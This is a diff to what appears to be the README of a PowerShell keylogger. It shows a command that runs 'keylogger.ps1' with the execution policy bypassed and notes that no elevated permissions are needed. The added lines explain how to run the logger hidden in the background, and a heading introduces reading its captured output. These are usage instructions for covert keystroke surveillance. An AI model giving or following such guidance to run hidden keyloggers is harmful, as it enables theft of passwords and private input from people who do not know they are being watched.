@@ -12,6 +12,8 @@ powershell.exe -ExecutionPolicy Bypass -File keylogger.ps1
 ```
 This command does not require elevated permissions
 
+To run this as a job or in the background append the `-windowstyle hidden` argument to the previous command
+
 # Interpreting Output
 
 Later functional version may do this automatically, but for now here is the output table
